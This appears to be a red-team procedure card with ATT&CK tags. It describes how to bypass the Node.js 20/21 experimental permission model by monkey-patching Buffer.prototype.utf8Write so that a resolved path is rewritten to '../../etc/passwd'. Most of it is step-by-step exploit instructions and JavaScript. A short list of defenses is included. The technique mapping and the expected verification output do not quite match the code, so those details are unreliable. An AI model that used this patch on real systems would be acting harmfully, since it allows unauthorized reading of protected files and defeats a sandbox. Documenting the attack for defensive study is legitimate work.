---
id: proc-monkey-patch-buffer-nodejs
tags:
  - monkey-patch
  - buffer
  - node-js
  - code-modification
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2024-10-01'
techniques:
  - '[[Dynamic Linker Hijacking]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:26:22.123Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Dynamic Linker Hijacking]]'
  - '[[JavaScript]]'
---
# Monkey-Patch-Buffer-Internals-in-Node.js

## Summary

This procedure overrides the Buffer.prototype.utf8Write method in Node.js to intercept and modify strings during UTF-8 encoding in Buffer creation, enabling manipulation of resolved paths in the experimental permission model.

## Description

In Node.js versions 20 and 21, the experimental permission model uses path.resolve() to sanitize user-provided paths, followed by conversion to a Buffer via Buffer.from(). An attacker with code execution can monkey-patch Buffer.prototype.utf8Write to alter the string being written, effectively bypassing traversal protections. This is particularly effective in environments where user input controls file paths, allowing subsequent steps to access files like /etc/passwd outside the intended directory. Prerequisites include JavaScript execution within the Node.js process.

## Requirements

1. Node.js 20 or 21 with experimental permission model enabled
2. Code execution access (e.g., via REPL, vulnerable app, or RCE)
3. Knowledge of the target path resolution flow in the application

## Defense

Defensive measures and detection strategies:

- Disable experimental permission model or upgrade to patched Node.js versions
- Implement code integrity checks to detect prototype modifications (e.g., using Object.freeze on Buffer.prototype)
- Monitor for unusual Buffer operations or filesystem accesses via audit logs
- Use sandboxing or VM isolation for untrusted code execution

## Objectives

1. Alter path resolution during Buffer creation to insert traversal sequences
2. Prepare for unauthorized file access in permission-controlled environments
3. Bypass built-in sanitization without direct filesystem manipulation

## Instructions

### Step 1: Prepare the Environment

**Context**: Ensure you have a Node.js REPL or script execution context where the permission model is active.

Start Node.js with the experimental permission model:

```bash
node --experimental-permissions script.js
```

> This enables the permission model; verify by attempting a restricted file access, which should fail without the patch.

### Step 2: Apply the Monkey-Patch

**Context**: Override utf8Write to modify strings containing resolved paths, e.g., replacing safe paths with traversal-enabled ones.

Execute the following JavaScript in the Node.js context:

```javascript
const originalUtf8Write = Buffer.prototype.utf8Write;
Buffer.prototype.utf8Write = function(string, offset, length) {
  // Detect and modify path strings (customize based on app's resolved path pattern)
  if (typeof string === 'string' && string.includes('resolved/path')) {
    string = string.replace(/resolved\/path/, '../../etc/passwd');
  }
  // Invoke original method with modified string
  return originalUtf8Write.call(this, string, offset, length);
};
console.log('Buffer patch applied');
```

> The patch intercepts writes; test by creating a Buffer from a sample path: `Buffer.from(path.resolve('/safe', '../test'))` – the resulting buffer should show the modified path when inspected.

### Step 3: Verify the Patch

**Context**: Confirm the modification works by logging or inspecting a Buffer creation.

```javascript
const testPath = path.resolve('/intended/dir', '../../test.txt');
const buf = Buffer.from(testPath);
console.log(buf.toString());  // Should output modified path like '/../../etc/passwd'
```

> Successful verification shows the altered string in the Buffer, indicating the patch is active for subsequent exploits.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Dynamic Linker Hijacking]] Modify Code
- [[JavaScript]] Command and Scripting Interpreter: JavaScript

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[monkey-patch]]
- [[buffer-modification]]
- [[node-js-exploit]]
